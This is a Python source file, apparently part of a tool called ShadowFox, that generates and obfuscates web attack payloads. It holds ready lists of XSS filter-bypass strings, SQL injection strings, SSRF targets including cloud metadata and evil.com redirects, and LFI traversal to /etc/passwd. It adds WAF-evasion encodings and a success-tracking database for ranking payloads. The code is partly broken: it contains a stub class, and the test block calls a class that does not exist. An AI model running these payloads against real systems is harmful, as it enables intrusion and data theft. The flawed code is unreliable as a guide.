# shadowfox/engines/mutation_engine.py

import json
import random
import re
import base64
import urllib.parse
import hashlib
from typing import Dict, List, Any, Tuple
import logging
from datetime import datetime
import sqlite3
from pathlib import Path


class ImeKlase:
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('ImeKlase')

    def run(self):
        self.logger.info("✅ ImeKlase module started")
        # TODO: implement logic here
class RainbowMutation:
    """
    AI-Driven Mutation Engine sa Rainbow Tables pristupom
    Generiše mutirane payload-e koristeći AI heuristiku i rainbow table logiku
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('MutationEngine')
        
        # Rainbow Tables - hash -> payload mapiranje za brže lookup
        self.rainbow_cache = {}
        self._init_rainbow_tables()
        
        # AI Mutation Rules - pravila za inteligentne mutacije
        self.mutation_rules = self._load_ai_mutation_rules()
        
        # Context-aware patterns za različite tehnologije
        self.context_patterns = self._load_context_patterns()
        
        # Success rate tracking za AI learning
        self.success_memory = {}
    
    def _init_rainbow_tables(self):
        """Inicijalizuje Rainbow Tables za brže payload lookup"""
        try:
            rainbow_db = self.operator.db_dir / "rainbow_tables.db"
            
            with sqlite3.connect(rainbow_db) as conn:
                # Rainbow table struktura
                conn.execute('''
                    CREATE TABLE IF NOT EXISTS rainbow_payloads (
                        hash_key TEXT PRIMARY KEY,
                        payload_type TEXT NOT NULL,
                        base_payload TEXT NOT NULL,
                        mutated_payload TEXT NOT NULL,
                        context_tags TEXT,
                        success_count INTEGER DEFAULT 0,
                        total_attempts INTEGER DEFAULT 0,
                        last_success TIMESTAMP,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                
                # Mutation patterns table
                conn.execute('''
                    CREATE TABLE IF NOT EXISTS mutation_patterns (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        pattern_name TEXT NOT NULL,
                        pattern_type TEXT NOT NULL,
                        base_pattern TEXT NOT NULL,
                        mutations TEXT NOT NULL,
                        effectiveness_score REAL DEFAULT 0.0,
                        context_requirements TEXT
                    )
                ''')
                
            self.logger.info("Rainbow Tables inicijalizovane")
        except Exception as e:
            self.logger.error(f"Greška pri inicijalizaciji Rainbow Tables: {e}")
    
    def _load_ai_mutation_rules(self) -> Dict:
        """Učitava AI pravila za mutacije - ova su 'naučena' iz iskustva"""
        return {
            "XSS": {
                "encoding_mutations": [
                    "url_encode", "double_url_encode", "html_entity", "unicode", 
                    "hex_encode", "base64", "mixed_case"
                ],
                "context_aware": {
                    "input_field": ["<script>", "javascript:", "on{event}="],
                    "url_param": ["<img src=x onerror=", "<svg onload="],
                    "json_context": ["\\u003cscript\\u003e", "\"><script>"],
                    "attr_context": ['" onmouseover="', "' autofocus onfocus='"]
                },
                "ai_heuristics": {
                    "filter_bypass": ["<scr<script>ipt>", "<<SCRIPT>script>"],
                    "waf_evasion": ["/**/", "-- -", "/*! */", "+//"],
                    "encoding_mix": ["mix_encodings", "partial_encode"]
                }
            },
            
            "SQLi": {
                "injection_points": [
                    "union_based", "boolean_based", "time_based", "error_based"
                ],
                "context_aware": {
                    "numeric": ["1 OR 1=1", "1' OR '1'='1", "1\" OR \"1\"=\"1"],
                    "string": ["' OR 1=1--", "\" OR 1=1--", "') OR ('1'='1"],
                    "search": ["%' OR 1=1--", "%\" OR 1=1--"],
                    "json": ["{\"$ne\": null}", "{\"$regex\": \".*\"}"]
                },
                "ai_heuristics": {
                    "blind_detection": ["' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"],
                    "union_fuzzing": ["' UNION SELECT NULL--", "' UNION ALL SELECT NULL,NULL--"],
                    "error_extraction": ["' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--"]
                }
            },
            
            "SSRF": {
                "protocols": ["http://", "https://", "file://", "ftp://", "gopher://"],
                "targets": ["127.0.0.1", "localhost", "169.254.169.254", "::1"],
                "context_aware": {
                    "url_param": ["http://evil.com", "//evil.com"],
                    "redirect": ["@evil.com", "evil.com@localhost"],
                    "dns_rebinding": ["redir.evil.com"]
                },
                "ai_heuristics": {
                    "bypass_filters": ["http://127.1", "http://0177.0.0.1", "http://[::1]"],
                    "cloud_metadata": ["http://169.254.169.254/latest/meta-data/"],
                    "internal_services": ["http://localhost:6379", "http://127.0.0.1:8080"]
                }
            },
            
            "LFI": {
                "traversal_patterns": ["../", "..\\", "%2e%2e%2f", "....//"],
                "targets": ["/etc/passwd", "/etc/hosts", "C:\\windows\\system32\\drivers\\etc\\hosts"],
                "context_aware": {
                    "php_wrapper": ["php://filter/", "data://text/plain,", "expect://"],
                    "null_byte": ["%00", "\\x00"],
                    "encoding": ["%2e%2e%2f", "%252e%252e%252f"]
                },
                "ai_heuristics": {
                    "deep_traversal": ["../../../../../../../", "..\\..\\..\\..\\..\\..\\"],
                    "log_poisoning": ["/var/log/apache2/access.log", "/proc/self/environ"]
                }
            }
        }
    
    def _load_context_patterns(self) -> Dict:
        """Učitava kontekst-specifične pattern-e za različite tehnologije"""
        return {
            "WordPress": {
                "admin_paths": ["/wp-admin/", "/wp-login.php"],
                "common_params": ["s", "p", "cat", "author"],
                "specific_vulns": ["wp_query", "meta_query", "tax_query"]
            },
            "PHP": {
                "dangerous_functions": ["eval", "system", "exec", "shell_exec"],
                "magic_vars": ["$_GET", "$_POST", "$_REQUEST", "$_COOKIE"],
                "wrappers": ["php://input", "php://filter", "data://"]
            },
            "ASP.NET": {
                "viewstate": ["__VIEWSTATE", "__EVENTVALIDATION"],
                "common_params": ["id", "page", "ctrl"],
                "specific_vulns": ["padding_oracle", "deserialization"]
            },
            "JavaScript": {
                "dom_props": ["innerHTML", "outerHTML", "document.write"],
                "events": ["onload", "onerror", "onmouseover", "onfocus"],
                "contexts": ["script_tag", "attribute", "url"]
            }
        }
    
    def generate_mutations(self, base_payload: str, payload_type: str, 
                          context: Dict = None, count: int = 10) -> List[Dict]:
        """
        Glavna AI funkcija za generisanje mutiranih payload-a
        """
        self.logger.info(f"Generiše {count} mutacija za {payload_type}: {base_payload[:50]}...")
        
        mutations = []
        
        # Proveri Rainbow Tables prvo
        cached_mutations = self._check_rainbow_cache(base_payload, payload_type, context)
        if cached_mutations:
            mutations.extend(cached_mutations[:count//2])  # Uzmi pola iz cache-a
        
        # Generiši nove AI-driven mutacije
        ai_mutations = self._generate_ai_mutations(base_payload, payload_type, context, count - len(mutations))
        mutations.extend(ai_mutations)
        
        # Sortiraj po AI confidence score
        mutations.sort(key=lambda x: x.get('confidence_score', 0), reverse=True)
        
        # Sačuvaj nove mutacije u Rainbow Tables
        self._cache_mutations(mutations, payload_type, context)
        
        # Loguj u operator
        self.operator.log_agent_action("MutationEngine", "mutations_generated", {
            "base_payload": base_payload,
            "payload_type": payload_type,
            "mutations_count": len(mutations),
            "context": context
        })
        
        return mutations[:count]
    
    def _check_rainbow_cache(self, base_payload: str, payload_type: str, context: Dict) -> List[Dict]:
        """Provera Rainbow Tables za postojeće mutacije"""
        try:
            base_hash = hashlib.md5(f"{base_payload}:{payload_type}".encode()).hexdigest()
            rainbow_db = self.operator.db_dir / "rainbow_tables.db"
            
            with sqlite3.connect(rainbow_db) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.execute('''
                    SELECT * FROM rainbow_payloads 
                    WHERE hash_key LIKE ? AND payload_type = ?
                    ORDER BY success_count DESC, total_attempts ASC
                    LIMIT 20
                ''', (f"{base_hash[:8]}%", payload_type))
                
                cached = []
                for row in cursor.fetchall():
                    cached.append({
                        "payload": row["mutated_payload"],
                        "confidence_score": row["success_count"] / max(row["total_attempts"], 1),
                        "mutation_type": "rainbow_cache",
                        "hash_key": row["hash_key"],
                        "success_history": {
                            "success_count": row["success_count"],
                            "total_attempts": row["total_attempts"]
                        }
                    })
                
                return cached
                
        except Exception as e:
            self.logger.error(f"Greška pri čitanju Rainbow cache: {e}")
            return []
    
    def _generate_ai_mutations(self, base_payload: str, payload_type: str, 
                              context: Dict, count: int) -> List[Dict]:
        """AI-driven generisanje novih mutacija"""
        mutations = []
        rules = self.mutation_rules.get(payload_type, {})
        
        # Context-aware mutacije
        if context:
            context_mutations = self._apply_context_mutations(base_payload, payload_type, context)
            mutations.extend(context_mutations)
        
        # Encoding mutacije
        encoding_mutations = self._apply_encoding_mutations(base_payload, rules.get("encoding_mutations", []))
        mutations.extend(encoding_mutations)
        
        # AI Heuristic mutacije
        heuristic_mutations = self._apply_ai_heuristics(base_payload, payload_type, rules.get("ai_heuristics", {}))
        mutations.extend(heuristic_mutations)
        
        # Hybrid mutacije (kombinacija tehnika)
        hybrid_mutations = self._generate_hybrid_mutations(base_payload, payload_type)
        mutations.extend(hybrid_mutations)
        
        # Random mutation za neočekivane slučajeve
        random_mutations = self._generate_random_mutations(base_payload, payload_type, 5)
        mutations.extend(random_mutations)
        
        return mutations[:count]
    
    def _apply_context_mutations(self, payload: str, payload_type: str, context: Dict) -> List[Dict]:
        """Primenjuje kontekst-specifične mutacije"""
        mutations = []
        rules = self.mutation_rules.get(payload_type, {}).get("context_aware", {})
        
        for context_type, patterns in rules.items():
            if context_type in str(context).lower():
                for pattern in patterns:
                    mutated = pattern.replace("{payload}", payload)
                    mutations.append({
                        "payload": mutated,
                        "confidence_score": 0.8,
                        "mutation_type": f"context_{context_type}",
                        "base_pattern": pattern
                    })
        
        return mutations
    
    def _apply_encoding_mutations(self, payload: str, encoding_types: List[str]) -> List[Dict]:
        """Primenjuje različite tipove enkodiranja"""
        mutations = []
        
        for enc_type in encoding_types:
            try:
                if enc_type == "url_encode":
                    mutated = urllib.parse.quote(payload)
                elif enc_type == "double_url_encode":
                    mutated = urllib.parse.quote(urllib.parse.quote(payload))
                elif enc_type == "base64":
                    mutated = base64.b64encode(payload.encode()).decode()
                elif enc_type == "hex_encode":
                    mutated = payload.encode().hex()
                elif enc_type == "html_entity":
                    mutated = "".join(f"&#{ord(c)};" for c in payload)
                elif enc_type == "unicode":
                    mutated = "".join(f"\\u{ord(c):04x}" for c in payload)
                elif enc_type == "mixed_case":
                    mutated = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
                else:
                    continue
                
                mutations.append({
                    "payload": mutated,
                    "confidence_score": 0.6,
                    "mutation_type": f"encoding_{enc_type}",
                    "original": payload
                })
            except Exception as e:
                self.logger.debug(f"Encoding greška {enc_type}: {e}")
        
        return mutations
    
    def _apply_ai_heuristics(self, payload: str, payload_type: str, heuristics: Dict) -> List[Dict]:
        """Primenjuje AI heuristike za napredne mutacije"""
        mutations = []
        
        for heuristic_type, patterns in heuristics.items():
            for pattern in patterns:
                if "{payload}" in pattern:
                    mutated = pattern.replace("{payload}", payload)
                else:
                    mutated = pattern
                
                # AI confidence na osnovu historical success
                confidence = self._calculate_ai_confidence(mutated, payload_type, heuristic_type)
                
                mutations.append({
                    "payload": mutated,
                    "confidence_score": confidence,
                    "mutation_type": f"ai_heuristic_{heuristic_type}",
                    "heuristic_pattern": pattern
                })
        
        return mutations
    
    def _generate_hybrid_mutations(self, payload: str, payload_type: str) -> List[Dict]:
        """Generiše hibridne mutacije kombinujući više tehnika"""
        mutations = []
        
        # Kombinuj encoding + obfuscation
        encoded_payload = urllib.parse.quote(payload)
        obfuscated = encoded_payload.replace("%", "%%25")
        
        mutations.append({
            "payload": obfuscated,
            "confidence_score": 0.7,
            "mutation_type": "hybrid_encode_obfuscate"
        })
        
        # Kombinuj case manipulation + special chars
        case_mixed = "".join(c.swapcase() if c.isalpha() else c for c in payload)
        with_nulls = case_mixed.replace(" ", "%00")
        
        mutations.append({
            "payload": with_nulls,
            "confidence_score": 0.5,
            "mutation_type": "hybrid_case_null"
        })
        
        return mutations
    
    def _generate_random_mutations(self, payload: str, payload_type: str, count: int) -> List[Dict]:
        """Generiše nasumične mutacije za edge case-ove"""
        mutations = []
        
        for _ in range(count):
            # Random char insertion
            pos = random.randint(0, len(payload))
            random_char = random.choice(['%', '&', '#', '\\', '/'])
            mutated = payload[:pos] + random_char + payload[pos:]
            
            mutations.append({
                "payload": mutated,
                "confidence_score": 0.3,
                "mutation_type": "random_insertion"
            })
        
        return mutations
    
    def _calculate_ai_confidence(self, payload: str, payload_type: str, heuristic_type: str) -> float:
        """Izračunava AI confidence score na osnovu istorijskih podataka"""
        memory_key = f"{payload_type}:{heuristic_type}"
        
        if memory_key in self.success_memory:
            history = self.success_memory[memory_key]
            return history["success_rate"] * 0.9  # Slightly conservative
        
        # Default confidence za nove pattern-e
        default_confidence = {
            "filter_bypass": 0.8,
            "waf_evasion": 0.7,
            "encoding_mix": 0.6,
            "blind_detection": 0.9,
            "union_fuzzing": 0.8,
            "bypass_filters": 0.7
        }
        
        return default_confidence.get(heuristic_type, 0.5)
    
    def _cache_mutations(self, mutations: List[Dict], payload_type: str, context: Dict):
        """Čuva generisane mutacije u Rainbow Tables"""
        try:
            rainbow_db = self.operator.db_dir / "rainbow_tables.db"
            
            with sqlite3.connect(rainbow_db) as conn:
                for mutation in mutations:
                    hash_key = hashlib.md5(f"{mutation['payload']}:{payload_type}".encode()).hexdigest()
                    
                    conn.execute('''
                        INSERT OR IGNORE INTO rainbow_payloads 
                        (hash_key, payload_type, base_payload, mutated_payload, context_tags)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (
                        hash_key, payload_type, 
                        mutation.get('original', ''), 
                        mutation['payload'],
                        json.dumps(context) if context else None
                    ))
        except Exception as e:
            self.logger.error(f"Greška pri cache-ovanju mutacija: {e}")
    
    def update_success_rate(self, payload_hash: str, success: bool):
        """Ažurira success rate za AI learning"""
        try:
            rainbow_db = self.operator.db_dir / "rainbow_tables.db"
            
            with sqlite3.connect(rainbow_db) as conn:
                if success:
                    conn.execute('''
                        UPDATE rainbow_payloads 
                        SET success_count = success_count + 1, 
                            total_attempts = total_attempts + 1,
                            last_success = CURRENT_TIMESTAMP
                        WHERE hash_key = ?
                    ''', (payload_hash,))
                else:
                    conn.execute('''
                        UPDATE rainbow_payloads 
                        SET total_attempts = total_attempts + 1
                        WHERE hash_key = ?
                    ''', (payload_hash,))
                    
        except Exception as e:
            self.logger.error(f"Greška pri ažuriranju success rate: {e}")
    
    def get_top_performers(self, payload_type: str, limit: int = 10) -> List[Dict]:
        """Vraća najbolje performanse payload-e iz Rainbow Tables"""
        try:
            rainbow_db = self.operator.db_dir / "rainbow_tables.db"
            
            with sqlite3.connect(rainbow_db) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.execute('''
                    SELECT *, 
                           CASE WHEN total_attempts > 0 
                                THEN CAST(success_count AS REAL) / total_attempts 
                                ELSE 0 END as success_rate
                    FROM rainbow_payloads 
                    WHERE payload_type = ? AND total_attempts >= 3
                    ORDER BY success_rate DESC, success_count DESC
                    LIMIT ?
                ''', (payload_type, limit))
                
                return [dict(row) for row in cursor.fetchall()]
                
        except Exception as e:
            self.logger.error(f"Greška pri čitanju top performera: {e}")
            return []

# Test funkcionalnosti
if __name__ == "__main__":
    from operator import ShadowFoxOperator
    
    # Test setup
    op = ShadowFoxOperator()
    mutation_engine = AIDriverMutationEngine(op)
    
    # Test XSS mutacije
    base_xss = "<script>alert('test')</script>"
    context = {"input_field": True, "technology": "PHP"}
    
    mutations = mutation_engine.generate_mutations(base_xss, "XSS", context, 15)
    
    print("=== XSS MUTATIONS ===")
    for i, mut in enumerate(mutations, 1):
        print(f"{i:2d}. [{mut['confidence_score']:.2f}] {mut['mutation_type']}")
        print(f"     {mut['payload'][:100]}...")
        print()
    
    # Test SQLi mutacije
    base_sqli = "' OR 1=1--"
    sqli_mutations = mutation_engine.generate_mutations(base_sqli, "SQLi", {"numeric": False}, 10)
    
    print("=== SQLI MUTATIONS ===")
    for i, mut in enumerate(sqli_mutations, 1):
        print(f"{i:2d}. [{mut['confidence_score']:.2f}] {mut['mutation_type']}")
        print(f"     {mut['payload']}")
        print()
